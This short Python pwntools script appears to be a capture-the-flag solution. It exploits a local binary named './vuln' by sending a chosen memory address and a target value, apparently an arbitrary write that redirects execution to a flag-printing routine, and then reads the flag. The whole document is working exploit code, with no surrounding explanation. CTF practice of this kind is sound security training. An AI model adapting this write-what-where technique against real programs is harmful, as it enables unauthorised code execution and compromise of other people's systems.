from pwn import *

context(terminal=['tmux','new-window'])
p = process('./vuln')
# p = gdb.debug('./vuln')

address = 0x0804a01c
value = 0x080485c6

p.sendline(str(address))
p.sendline(str(value))
p.recvuntil('flag\n')
log.info("Here's the flag: {}".format(p.recvall().decode().strip()))
